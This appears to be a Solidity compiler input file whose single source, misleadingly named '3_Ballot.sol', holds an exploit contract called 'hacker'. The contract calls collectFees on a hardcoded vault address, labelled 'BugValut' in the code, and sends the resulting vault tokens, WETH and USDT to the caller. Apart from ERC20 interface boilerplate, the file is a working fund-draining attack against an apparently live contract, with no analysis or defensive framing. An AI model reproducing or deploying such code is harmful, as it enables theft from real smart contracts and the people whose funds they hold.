{
  "language": "Solidity",
  "settings": {
    "libraries": {},
    "metadata": {
      "useLiteralContent": true
    },
    "optimizer": {
      "enabled": true,
      "runs": 200
    },
    "remappings": [],
    "outputSelection": {
      "*": {
        "*": [
          "*"
        ],
        "": [
          "*"
        ]
      }
    }
  },
  "sources": {
    "contracts/3_Ballot.sol": {
      "content": "pragma solidity ^0.8.0;\n\ninterface ERC20 {\n  /**\n   * @dev Returns the amount of tokens in existence.\n   */\n  function totalSupply() external view returns (uint256);\n\n  /**\n   * @dev Returns the token decimals.\n   */\n  function decimals() external view returns (uint8);\n\n  /**\n   * @dev Returns the token symbol.\n   */\n  function symbol() external view returns (string memory);\n\n  /**\n  * @dev Returns the token name.\n  */\n  function name() external view returns (string memory);\n\n  /**\n   * @dev Returns the bep token owner.\n   */\n  function getOwner() external view returns (address);\n\n  /**\n   * @dev Returns the amount of tokens owned by `account`.\n   */\n  function balanceOf(address account) external view returns (uint256);\n\n  /**\n   * @dev Moves `amount` tokens from the caller's account to `recipient`.\n   *\n   * Returns a boolean value indicating whether the operation succeeded.\n   *\n   * Emits a {Transfer} event.\n   */\n  function transfer(address recipient, uint256 amount) external returns (bool);\n\n  /**\n   * @dev Returns the remaining number of tokens that `spender` will be\n   * allowed to spend on behalf of `owner` through {transferFrom}. This is\n   * zero by default.\n   *\n   * This value changes when {approve} or {transferFrom} are called.\n   */\n  function allowance(address _owner, address spender) external view returns (uint256);\n\n  /**\n   * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\n   *\n   * Returns a boolean value indicating whether the operation succeeded.\n   *\n   * IMPORTANT: Beware that changing an allowance with this method brings the risk\n   * that someone may use both the old and the new allowance by unfortunate\n   * transaction ordering. One possible solution to mitigate this race\n   * condition is to first reduce the spender's allowance to 0 and set the\n   * desired value afterwards:\n   * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n   *\n   * Emits an {Approval} event.\n   */\n  function approve(address spender, uint256 amount) external returns (bool);\n\n  /**\n   * @dev Moves `amount` tokens from `sender` to `recipient` using the\n   * allowance mechanism. `amount` is then deducted from the caller's\n   * allowance.\n   *\n   * Returns a boolean value indicating whether the operation succeeded.\n   *\n   * Emits a {Transfer} event.\n   */\n  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n\n  /**\n   * @dev Emitted when `value` tokens are moved from one account (`from`) to\n   * another (`to`).\n   *\n   * Note that `value` may be zero.\n   */\n  event Transfer(address indexed from, address indexed to, uint256 value);\n\n  /**\n   * @dev Emitted when the allowance of a `spender` for an `owner` is set by\n   * a call to {approve}. `value` is the new allowance.\n   */\n  event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n\ninterface BugValut{\n    function collectFees(uint256 amount0, uint256 amount1) external;\n}\n\ninterface USDT{\n    function allowance(address owner, address spender) external returns (uint);\n    function transferFrom(address from, address to, uint value) external;\n    function approve(address spender, uint value) external;\n    function transfer(address _to, uint _value) external;\n}\n\ncontract hacker{\n    address targetvault=0xc4ff55a4329f84f9Bf0F5619998aB570481EBB48;\n    address usdt=0xdAC17F958D2ee523a2206206994597C13D831ec7;\n    address weth=0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\n    address public owner;\n\n    function _getbalance(address token) private returns (uint256){\n        return ERC20(token).balanceOf(address(this));\n    }\n    \n    function ERC20Transfer(\n        address tokencontract,\n        address _to,\n        uint256 _value\n    ) internal{\n        if(tokencontract!=usdt){\n            ERC20 _token=ERC20(tokencontract);\n            bool success=_token.transfer(_to, _value);\n        }else{\n            USDT _token=USDT(tokencontract);\n            _token.transfer(_to, _value);\n        }\n    }\n    \n    function first() public{\n        BugValut(targetvault).collectFees(0,0);\n        ERC20Transfer(targetvault,msg.sender,_getbalance(targetvault));\n    }\n\n    function second(uint fee1,uint fee2) public{\n        BugValut(targetvault).collectFees(fee1,fee2);\n        ERC20Transfer(weth,msg.sender,_getbalance(weth));\n        ERC20Transfer(usdt,msg.sender,_getbalance(usdt));\n    }\n\n    fallback() external payable{\n\n    }\n}"
    }
  }
}